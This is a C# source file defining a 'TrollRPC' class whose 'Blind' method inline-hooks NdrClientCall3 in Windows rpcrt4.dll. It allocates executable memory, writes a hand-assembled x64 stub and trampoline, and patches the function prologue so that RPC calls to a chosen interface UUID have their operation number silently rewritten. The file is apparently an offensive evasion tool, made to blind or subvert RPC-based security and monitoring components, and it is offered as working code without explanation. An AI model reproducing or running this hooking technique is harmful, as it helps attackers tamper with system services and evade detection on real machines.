using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Linq;
using System.Management;


    public class TrollRPC
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpOldProtect);

        [DllImport("rpcrt4.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern IntPtr NdrClientCall3(IntPtr pMidlStubDesc, IntPtr pFormatString, IntPtr arg2, IntPtr arg3, IntPtr arg4);

        private static IntPtr _targetFunctionAddress = IntPtr.Zero;
        private static IntPtr _trampolineAddress = IntPtr.Zero;
        private static IntPtr _dynamicAsmStubAddress = IntPtr.Zero;
        private static readonly byte[] _originalPatchedBytes = new byte[JMP_ABS64_SIZE];
        private static readonly byte[] JMP_ABS64_PATTERN = {
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xFF, 0xE0,
            0x90, 0x90
        };
        private const int JMP_ABS64_SIZE = 14;
        private const int TRAMPOLINE_PROLOGUE_SIZE = 16;
        private const int TRAMPOLINE_JUMP_SIZE = JMP_ABS64_SIZE;
        private const int TRAMPOLINE_TOTAL_SIZE = TRAMPOLINE_PROLOGUE_SIZE + TRAMPOLINE_JUMP_SIZE;
        private static GCHandle _trampolineAddressValuePin;
        private static IntPtr _trampolineAddressForAsm = IntPtr.Zero;
        private static Guid _targetGuid;
        private static IntPtr _hookResultForAsm = IntPtr.Zero;
        private static GCHandle _hookResultForAsmPin;

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void HookedNdrClientCall3Callback(IntPtr arg0, IntPtr arg1, IntPtr arg2, IntPtr arg3, IntPtr arg4, IntPtr hookResultOutPtr);

        private static HookedNdrClientCall3Callback _hookedNdrClientCall3Delegate;
        private static IntPtr _hookedNdrClientCall3DelegatePtr;

        [StructLayout(LayoutKind.Sequential)]
        public struct RPC_SYNTAX_IDENTIFIER
        {
            public Guid Uuid;
            public ushort MajorVersion;
            public ushort MinorVersion;
        }

       [StructLayout(LayoutKind.Sequential)]
		public struct RPC_CLIENT_INTERFACE
		{
			public uint Length;
			public RPC_SYNTAX_IDENTIFIER InterfaceId;
			public RPC_SYNTAX_IDENTIFIER TransferSyntax;
			public IntPtr DispatchTable; // Could be null for client-side
			public uint RpcProtseqEndpointCount;
			public IntPtr RpcProtseqEndpoint;
			public IntPtr DefaultManagerEpv;
			public IntPtr InterpreterInfo;
			public uint Flags;
		}
        [StructLayout(LayoutKind.Sequential)]
        public struct MIDL_STUB_DESC
        {
            public IntPtr RpcInterfaceInformation;
        }

        private static void HookedNdrClientCall3_CSharp(IntPtr pMidlStubDesc, IntPtr pFormatString, IntPtr arg2, IntPtr arg3, IntPtr arg4, IntPtr hookResultOutPtr)
        {
            Marshal.WriteIntPtr(hookResultOutPtr, IntPtr.Zero);
            MIDL_STUB_DESC stubDesc = Marshal.PtrToStructure<MIDL_STUB_DESC>(pMidlStubDesc);
            RPC_CLIENT_INTERFACE rpcInterface = Marshal.PtrToStructure<RPC_CLIENT_INTERFACE>(stubDesc.RpcInterfaceInformation);
				
            Guid interfaceUuid = rpcInterface.InterfaceId.Uuid;
            if (interfaceUuid.Equals(_targetGuid))
            {
                Marshal.WriteIntPtr(hookResultOutPtr, (IntPtr)0xDEADBEEF);
            }
        }

        private static bool WriteMemory(IntPtr dest, byte[] src, int size)
        {
            uint oldProtect;
            VirtualProtect(dest, (UIntPtr)size, 0x40, out oldProtect); // PAGE_EXECUTE_READWRITE
            Marshal.Copy(src, 0, dest, size);
            VirtualProtect(dest, (UIntPtr)size, oldProtect, out oldProtect);
            return true;
        }

        private static byte[] GenerateDynamicAsmStub(IntPtr cSharpCallbackPtr, IntPtr dynamicAsmStubBaseAddr, IntPtr trampolineTargetAddr, IntPtr hookResultMemAddr, int targetOpnum, int modifiedOpnum)
        {
            var asmBytesList = new System.Collections.Generic.List<byte>();

            asmBytesList.AddRange(new byte[] { 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x53, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57 }); // Pushes
            asmBytesList.AddRange(new byte[] { 0x4C, 0x8B, 0x54, 0x24, 0x68, 0x4C, 0x8B, 0x5C, 0x24, 0x60, 0x4C, 0x8B, 0x64, 0x24, 0x58, 0x4C, 0x8B, 0x6C, 0x24, 0x50, 0x4C, 0x8B, 0x74, 0x24, 0x80 }); // Arg loads
            asmBytesList.AddRange(new byte[] { 0x49, 0x8B, 0xCA, 0x49, 0x8B, 0xD3, 0x4D, 0x8B, 0xC4, 0x4D, 0x8B, 0xCD }); // Arg moves
            
            int pushHookResultPtrFirstOffset = asmBytesList.Count;
            asmBytesList.AddRange(new byte[] { 0x48, 0xB8 });
            asmBytesList.AddRange(BitConverter.GetBytes(hookResultMemAddr.ToInt64()));
            asmBytesList.Add(0x50); // push rax

            asmBytesList.AddRange(new byte[] { 0x41, 0x56 }); // push r14
            asmBytesList.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x20 }); // sub rsp, 0x20

            int callCSharpOffset = asmBytesList.Count;
            asmBytesList.AddRange(new byte[] { 0xE8, 0x00, 0x00, 0x00, 0x00 }); // call CSharp

            asmBytesList.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x30 }); // add rsp, 0x30

            int loadHookResultOffset = asmBytesList.Count;
            asmBytesList.AddRange(new byte[] { 0x48, 0xA1 });
            asmBytesList.AddRange(BitConverter.GetBytes(hookResultMemAddr.ToInt64())); // mov rax, [hookResultMemAddr]

            asmBytesList.AddRange(new byte[] { 0x48, 0x81, 0xF8, 0xEF, 0xBE, 0xAD, 0xDE }); // cmp rax, 0xDEADBEEF

            int jeSkipOpnumModificationOffset = asmBytesList.Count;
            asmBytesList.AddRange(new byte[] { 0x74, 0x00 }); // je skip_opnum_modification

            int opnumModificationStartOffset = asmBytesList.Count;
            asmBytesList.AddRange(new byte[] { 0x4C, 0x8B, 0x54, 0x24, 0x60 }); // mov r10, [rsp+0x60] (Opnum)

            if (targetOpnum >= -128 && targetOpnum <= 127)
            {
                asmBytesList.AddRange(new byte[] { 0x49, 0x83, 0xFA, (byte)targetOpnum });
            }
            else
            {
                asmBytesList.AddRange(new byte[] { 0x49, 0x81, 0xFA });
                asmBytesList.AddRange(BitConverter.GetBytes(targetOpnum));
            }

            int jneInstructionOffset = asmBytesList.Count;
            asmBytesList.AddRange(new byte[] { 0x75, 0x00 }); // jne skip

            asmBytesList.AddRange(new byte[] { 0xC7, 0x44, 0x24, 0x60 });
            asmBytesList.AddRange(BitConverter.GetBytes(modifiedOpnum)); // mov dword ptr [rsp+0x60], modifiedOpnum

            int endOfModificationLogicOffset = asmBytesList.Count;

            asmBytesList.AddRange(new byte[] { 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5D, 0x5B, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58 }); // Pops

            int finalJmpOffset = asmBytesList.Count;
            asmBytesList.AddRange(new byte[] { 0x48, 0xB8 });
            asmBytesList.AddRange(BitConverter.GetBytes(trampolineTargetAddr.ToInt64()));
            asmBytesList.AddRange(new byte[] { 0xFF, 0xE0 }); // jmp rax

            byte[] finalAsmBytes = asmBytesList.ToArray();

            // Patch relative offsets
            BitConverter.GetBytes((int)(cSharpCallbackPtr.ToInt64() - (dynamicAsmStubBaseAddr.ToInt64() + callCSharpOffset + 5))).CopyTo(finalAsmBytes, callCSharpOffset + 1);
            finalAsmBytes[jeSkipOpnumModificationOffset + 1] = (byte)((sbyte)(dynamicAsmStubBaseAddr.ToInt64() + endOfModificationLogicOffset - (dynamicAsmStubBaseAddr.ToInt64() + jeSkipOpnumModificationOffset + 2)));
            finalAsmBytes[jneInstructionOffset + 1] = (byte)((sbyte)(dynamicAsmStubBaseAddr.ToInt64() + jneInstructionOffset + 2 + 8 - (dynamicAsmStubBaseAddr.ToInt64() + jneInstructionOffset + 2)));

            return finalAsmBytes;
        }

        public static bool Blind(string targetUuidString, int targetOpnum, int modifiedOpnum)
        {
            Guid.TryParse(targetUuidString, out _targetGuid);

            IntPtr hMod = GetModuleHandle("rpcrt4.dll");
            _targetFunctionAddress = GetProcAddress(hMod, "NdrClientCall3");

            _hookedNdrClientCall3Delegate = new HookedNdrClientCall3Callback(HookedNdrClientCall3_CSharp);
            _hookedNdrClientCall3DelegatePtr = Marshal.GetFunctionPointerForDelegate(_hookedNdrClientCall3Delegate);

            _hookResultForAsm = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(_hookResultForAsm, IntPtr.Zero);
            _hookResultForAsmPin = GCHandle.Alloc(_hookResultForAsm, GCHandleType.Pinned);

            _trampolineAddress = VirtualAlloc(IntPtr.Zero, (UIntPtr)TRAMPOLINE_TOTAL_SIZE, 0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE

            byte[] originalPrologue = new byte[TRAMPOLINE_PROLOGUE_SIZE];
            Marshal.Copy(_targetFunctionAddress, originalPrologue, 0, TRAMPOLINE_PROLOGUE_SIZE);
            Marshal.Copy(originalPrologue, 0, _trampolineAddress, TRAMPOLINE_PROLOGUE_SIZE);

            byte[] jumpBackPatch = new byte[JMP_ABS64_SIZE];
            Buffer.BlockCopy(JMP_ABS64_PATTERN, 0, jumpBackPatch, 0, JMP_ABS64_SIZE);
            IntPtr jumpBackTarget = (IntPtr)(_targetFunctionAddress.ToInt64() + TRAMPOLINE_PROLOGUE_SIZE);
            BitConverter.GetBytes(jumpBackTarget.ToInt64()).CopyTo(jumpBackPatch, 2);

            Marshal.Copy(jumpBackPatch, 0, (IntPtr)(_trampolineAddress.ToInt64() + TRAMPOLINE_PROLOGUE_SIZE), JMP_ABS64_SIZE);

            _trampolineAddressForAsm = _trampolineAddress;
            _trampolineAddressValuePin = GCHandle.Alloc(_trampolineAddressForAsm, GCHandleType.Pinned);

            _dynamicAsmStubAddress = VirtualAlloc(IntPtr.Zero, (UIntPtr)512, 0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE

            byte[] dynamicAsmStubBytes = GenerateDynamicAsmStub(_hookedNdrClientCall3DelegatePtr, _dynamicAsmStubAddress, _trampolineAddress, _hookResultForAsm, targetOpnum, modifiedOpnum);

            WriteMemory(_dynamicAsmStubAddress, dynamicAsmStubBytes, dynamicAsmStubBytes.Length);

            Marshal.Copy(_targetFunctionAddress, _originalPatchedBytes, 0, JMP_ABS64_SIZE);

            byte[] mainHookPatch = new byte[JMP_ABS64_SIZE];
            Buffer.BlockCopy(JMP_ABS64_PATTERN, 0, mainHookPatch, 0, JMP_ABS64_SIZE);
            BitConverter.GetBytes(_dynamicAsmStubAddress.ToInt64()).CopyTo(mainHookPatch, 2);

            WriteMemory(_targetFunctionAddress, mainHookPatch, JMP_ABS64_SIZE);

            return true;
        }

    }
